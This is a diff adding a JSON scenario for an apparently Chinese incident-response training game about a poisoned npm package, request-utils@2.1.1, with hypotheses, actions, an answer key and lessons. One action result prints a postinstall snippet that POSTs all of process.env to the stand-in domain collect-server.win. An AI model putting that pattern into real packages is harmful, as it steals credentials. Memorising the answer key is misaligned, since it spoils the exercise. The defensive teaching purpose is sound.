@@ -1,0 +1,314 @@
+{
+  "id": "supply-poison",
+  "title": "一个依赖包的投毒",
+  "intro": "安全情报通报：公司大量使用的 npm 包 request-utils 的 2.1.1 版本被投毒——维护者账号被盗，新版本窃取环境变量。CI 与生产已运行 2.1.1 四天。",
+  "domain": "build",
+  "layer": "依赖即攻击面：package.json 的每一行，都是一次对陌生人的信任",
+  "part": "master",
+  "chapterId": "security",
+  "order": 6,
+  "typeTags": [
+    "security",
+    "build"
+  ],
+  "difficulty": 3,
+  "scene": {
+    "role": "你是「鲜到家」的平台工程负责人。安全情报群弹出通报：request-utils@2.1.1 投毒——而你们的 CI 和生产，跑这个版本已经四天了。",
+    "architecture": "npm 源 → CI(install) → 生产服务(运行中) → 出站请求(外联)",
+    "tag": "供应链事故现场",
+    "symptoms": [
+      {
+        "type": "error",
+        "title": "安全情报通报",
+        "text": "request-utils 维护者 npm 账号于 4 天前被盗（钓鱼邮件窃取 token）。\n2.1.1 版本 postinstall 脚本：读取 process.env 全量 → POST 至外部域名 collect-server.win。\nnpm 官方已下架该版本。受影响组织：300+（持续增加）。"
+      },
+      {
+        "type": "text",
+        "title": "你们的暴露面",
+        "text": "package.json: \"request-utils\": \"^2.0.0\"\n→ 版本范围允许自动拉取 2.1.1；CI 与生产 node_modules 中均已安装。\n生产服务的 env：DB 密码、云 AccessKey、内部服务密钥——全部在 process.env 里。"
+      }
+    ],
+    "timeline": "投毒版本发布：4 天前 ｜ 你们的 CI 首次拉取：4 天前 ｜ 安全情报通报：今天上午 ｜ 恶意出站请求：每小时一次",
+    "impactHint": "投毒代码已经跑了四天——现在要做的三件事，按什么顺序？"
+  },
+  "hypotheses": [
+    {
+      "id": "h-poison",
+      "text": "2.1.1 的 postinstall 脚本窃取环境变量——env 里的 DB 密码/云凭证已外泄",
+      "excludeActionId": "a-code"
+    },
+    {
+      "id": "h-scope",
+      "text": "lockfile 版本范围 ^2.0.0 允许自动拉取新版本——供应链管理的第一道闸失效",
+      "excludeActionId": "a-lock"
+    },
+    {
+      "id": "h-network",
+      "text": "出站被防火墙拦截：恶意外联实际未成功",
+      "excludeActionId": "a-outbound"
+    },
+    {
+      "id": "h-worm",
+      "text": "恶意代码横向扩散：已感染其他服务或窃取更多数据",
+      "excludeActionId": "a-worm"
+    }
+  ],
+  "actions": [
+    {
+      "id": "a-alert",
+      "name": "核对安全情报与本地版本",
+      "desc": "通报说的是我们吗，我们在跑哪个版本",
+      "cost": 1,
+      "gain": "high",
+      "danger": false,
+      "effects": [],
+      "tests": [],
+      "hypotheses": [
+        {
+          "id": "h-poison",
+          "status": "up"
+        }
+      ],
+      "result": {
+        "type": "text",
+        "title": "本地核对",
+        "text": "通报包：request-utils@2.1.1（postinstall 窃取 env）。\n本地核对：CI 与生产 node_modules 均为 2.1.1（4 天前 lockfile 更新时拉入）。\n→ 我们在受影响名单上。三件事按序：止血 → 评估 → 重建信任。"
+      }
+    },
+    {
+      "id": "a-code",
+      "name": "审计本地 2.1.1 包的代码",
+      "desc": "恶意代码到底做了什么、做了多久",
+      "cost": 2,
+      "gain": "high",
+      "danger": false,
+      "effects": [],
+      "tests": [
+        "h-poison"
+      ],
+      "hypotheses": [
+        {
+          "id": "h-poison",
+          "status": "confirmed"
+        }
+      ],
+      "result": {
+        "type": "code",
+        "title": "2.1.1 diff（vs 2.0.9）",
+        "text": "+ postinstall: node ./scripts/collect.js\ncollect.js:\n  const env = process.env                 ← 全量环境变量\n  await fetch(\"https://collect-server.win\", { method: \"POST\", body: env })\n  // 伪装成 \"performance telemetry\"\n→ 恶意行为实锤：每 install 一次，env 全量外发一次。CI 每天 install，已外发 ≥4 次。"
+      }
+    },
+    {
+      "id": "a-envscope",
+      "name": "评估泄露的 env 内容与危害",
+      "desc": "env 里有什么、泄露了多严重",
+      "cost": 2,
+      "gain": "high",
+      "danger": false,
+      "effects": [],
+      "tests": [],
+      "hypotheses": [],
+      "result": {
+        "type": "text",
+        "title": "泄露内容评估",
+        "text": "CI 与生产的 env 均含：DB 主库密码、云 AccessKey+Secret、内部服务间密钥、第三方 API Key。\n全部为**长期有效凭据**（无过期机制）。\n→ 危害等级：最高——攻击者已持有一个组织的\"万能钥匙串\"四天。"
+      }
+    },
+    {
+      "id": "a-outbound",
+      "name": "查出站流量日志核对泄露事实",
+      "desc": "外联真的成功了吗，频率如何",
+      "cost": 1,
+      "gain": "high",
+      "danger": false,
+      "effects": [],
+      "tests": [
+        "h-network"
+      ],
+      "hypotheses": [
+        {
+          "id": "h-network",
+          "status": "excluded"
+        }
+      ],
+      "result": {
+        "type": "text",
+        "title": "出站日志",
+        "text": "NAT 网关日志：CI 与生产实例 → collect-server.win 的 POST，\n4 天共 9 次（CI install 触发 + 生产服务启动触发），出站成功。\n→ 外联成功实锤：env 已到手。防火墙没有拦——因为目标域名是\"新域名\"，无规则可拦。"
+      }
+    },
+    {
+      "id": "a-lock",
+      "name": "分析 lockfile 与版本范围策略",
+      "desc": "投毒版本是怎么混进来的",
+      "cost": 1,
+      "gain": "mid",
+      "danger": false,
+      "effects": [],
+      "tests": [
+        "h-scope"
+      ],
+      "hypotheses": [
+        {
+          "id": "h-scope",
+          "status": "confirmed"
+        }
+      ],
+      "result": {
+        "type": "code",
+        "title": "版本策略分析",
+        "text": "package.json: \"^2.0.0\"  ← 允许 2.x 任意版本\nlockfile: 4 天前 CI install 时被更新为 2.1.1 并提交\n→ 三重缺失：① ^ 范围自动拉新版本 ② 无内部私有源镜像 ③ 无 install 后完整性校验。"
+      }
+    },
+    {
+      "id": "a-worm",
+      "name": "排查横向扩散与更多失窃",
+      "desc": "恶意代码有没有做投毒之外的事",
+      "cost": 1,
+      "gain": "low",
+      "danger": false,
+      "effects": [],
+      "tests": [
+        "h-worm"
+      ],
+      "hypotheses": [
+        {
+          "id": "h-worm",
+          "status": "excluded"
+        }
+      ],
+      "result": {
+        "type": "text",
+        "title": "扩散排查",
+        "text": "collect.js 代码审计：仅 POST env，无文件读写、无横向扫描、无持久化。\n出站日志：仅外联 collect-server.win，无其他可疑目标。\n→ 恶意行为单一（窃取 env）：损失边界 = env 内容，可控评估。"
+      }
+    },
+    {
+      "id": "a-trustupgrade",
+      "name": "信任官方修复版直接升级 2.1.2",
+      "desc": "【状态变更】不等审计，直接升级到官方\"修复版\" 2.1.2",
+      "cost": 2,
+      "gain": "none",
+      "danger": true,
+      "effects": [],
+      "tests": [],
+      "hypotheses": [],
+      "result": {
+        "type": "text",
+        "title": "这个决定的风险",
+        "text": "2.1.2 由同一维护者账号发布——账号仍可能被盗。未审计就升级，等于把信任重新押回给\"可能已失守的源\"。\n→ 正确顺序：先降级到最后干净版本（2.0.9）+ 审计 2.1.2 diff，再决定是否升级。此选项作为反面教学。"
+      }
+    },
+    {
+      "id": "a-rotate",
+      "name": "全量轮换泄露凭据",
+      "desc": "【状态变更】DB 密码/云 AK/服务间密钥全部轮换",
+      "cost": 2,
+      "gain": "high",
+      "danger": false,
+      "effects": [],
+      "tests": [],
+      "hypotheses": [],
+      "result": {
+        "type": "text",
+        "title": "轮换执行",
+        "text": "按凭据爆炸半径排序：云 AK（先）→ DB 密码（滚动重启）→ 服务间密钥 → 第三方 Key。\n全部轮换完成，旧凭据失效。\n→ 攻击者手里的\"万能钥匙串\"作废——损失封顶在\"轮换前的一段窗口\"。"
+      }
+    },
+    {
+      "id": "a-purge",
+      "name": "清除投毒版本并降级锁定",
+      "desc": "【状态变更】CI/生产清除 2.1.1，锁定 2.0.9 + 迁移内部源",
+      "cost": 2,
+      "gain": "high",
+      "danger": false,
+      "effects": [],
+      "tests": [],
+      "hypotheses": [],
+      "result": {
+        "type": "text",
+        "title": "清除结果",
+        "text": "CI 与生产清除 2.1.1 → 锁定 2.0.9（最后干净版本）；\nnpm 源迁移至内部私有镜像（白名单同步）；\nCI 增加 install 后完整性校验（lockfile hash + 包内容 diff）。"
+      }
+    }
+  ],
+  "rootCauses": [
+    {
+      "id": "rc-poison",
+      "text": "request-utils@2.1.1 被投毒（维护者账号被盗），postinstall 窃取全量 env 并外发——DB 密码/云 AK/服务密钥泄露四天",
+      "correct": true
+    },
+    {
+      "id": "rc-scope",
+      "text": "^2.0.0 版本范围 + 无内部私有源 + 无完整性校验——供应链第一道闸失效，投毒版本自动进入 CI 与生产",
+      "correct": false
+    },
+    {
+      "id": "rc-network",
+      "text": "防火墙拦截了恶意出站，实际未泄露",
+      "correct": false
+    },
+    {
+      "id": "rc-worm",
+      "text": "恶意代码已横向扩散至其他系统",
+      "correct": false
+    }
+  ],
+  "expertCost": 8,
+  "restartActionId": "a-purge",
+  "expertChain": [
+    {
+      "thought": "先核对：通报的包、版本、行为——是不是正在发生在我们身上。",
+      "update": "本地 CI 与生产均为 2.1.1，投毒版本已在内部运行四天——我们就是受影响组织。",
+      "actionId": "a-alert",
+      "why": "1⚡ 核对是应急第一步：情报是\"行业面的\"，落地要回答\"我们中了几枪\"——版本核对 30 秒，决定启动应急还是归档情报。",
+      "conclusion": "受影响确认 → 审计恶意代码的实际行为。"
+    },
+    {
+      "thought": "审计投毒代码做了什么：只窃取，还是窃取+破坏+扩散？损失边界决定应急规模。",
+      "update": "postinstall 全量窃取 env 并 POST 外域，无破坏无扩散——损失边界 = env 内容。",
+      "actionId": "a-code",
+      "why": "2⚡ 审计恶意代码限定损失边界：env 泄露 = 凭据危机（要全量轮换）；如果是加密勒索 = 灾难恢复（另一个世界）。边界决定响应剧本。",
+      "conclusion": "损失边界 = env 凭据泄露 → 评估泄露内容。"
+    },
+    {
+      "thought": "评估泄露的 env：DB 密码/云 AK/服务密钥全是长期凭据——攻击者已持\"万能钥匙串\"四天。",
+      "update": "最高危害确认：全量凭据泄露且无过期机制——轮换必须立即执行，且按爆炸半径排序（云 AK 先）。",
+      "actionId": "a-envscope",
+      "why": "2⚡ 凭据泄露的危害 = 凭据权限 × 有效期：长期凭据泄露四天，等于把核心系统交出去四天——轮换速度就是止损速度。",
+      "conclusion": "全量凭据轮换列为第一优先级应急动作。"
+    },
+    {
+      "thought": "止血之后查供应链闸门：投毒版本怎么进来的——^ 范围自动拉新 + 无内部源 + 无完整性校验，三重缺失。",
+      "update": "闸门修复方案确立：锁定干净版本 + 内部私有源 + install 后完整性校验——把\"信任陌生人\"改成\"只信任审计过的版本\"。",
+      "actionId": "a-lock",
+      "why": "1⚡ 找到\"怎么进来的\"才能关闸：不修版本策略，下次投毒还会自动进来——应急处理的是这次，闸门修复管的是以后。",
+      "conclusion": "止血（轮换）+ 清除（降级锁定）+ 关闸（内部源+校验）三线完成。"
+    },
+    {
+      "thought": "横向扩散排查收尾：恶意代码只窃 env，无扩散——损失边界最终确认，应急闭环。",
+      "update": "停止收集。轮换 ✓ 清除 ✓ 关闸 ✓ 扩散排除 ✓——四线闭环。",
+      "actionId": "",
+      "why": "【停止规则】应急四线（止血/清除/关闸/扩散排查）全部完成且证据闭合；剩余动作是长期工程（依赖白名单治理）。",
+      "conclusion": "事件闭环。检查单：依赖 = 信任，install 前必答\"这个版本审计过吗、锁得住吗、外联监控得到吗\"。"
+    }
+  ],
+  "lessons": [
+    {
+      "text": "依赖即攻击面：package.json 的每一行，都是一次对陌生人的信任——供应链投毒直接窃取的是整个组织的凭据串。",
+      "principle": "安全思维：第三方包的 postinstall 脚本拥有与你的服务完全相同的权限（读 env/访问内网）。\"广泛使用的开源包\"恰恰是投毒的首选目标——使用者越多，回报越大。"
+    },
+    {
+      "text": "版本范围 ^ 是便利与风险的交易：^2.0.0 让你自动获得新功能，也让投毒版本自动进入你的 CI。",
+      "principle": "程序设计纪律：生产依赖锁定精确版本（lockfile + 无 ^ 前缀策略），升级走显式 PR + 内部私有源镜像白名单——\"自动更新\"只属于开发体验，不属于生产。"
+    },
+    {
+      "text": "凭据轮换的速度就是止损的速度：长期凭据泄露四天，等于把万能钥匙串交出去四天。",
+      "principle": "应急思维：env 里的凭据要按爆炸半径排序轮换（云 AK → DB → 服务间）；长期解是短期凭据化（自动轮换/最小权限 IAM），让\"泄露\"不再是\"灾难\"。"
+    },
+    {
+      "text": "出站流量日志是供应链投毒的检测线：没有它，你连\"已经泄露\"都不知道。",
+      "principle": "沉淀思维：install 后完整性校验（lockfile hash + 包内容 diff）+ 出站外联监控，是供应链安全的两条检测线——投毒的检测靠它们，而不靠信任。"
+    }
+  ]
+}
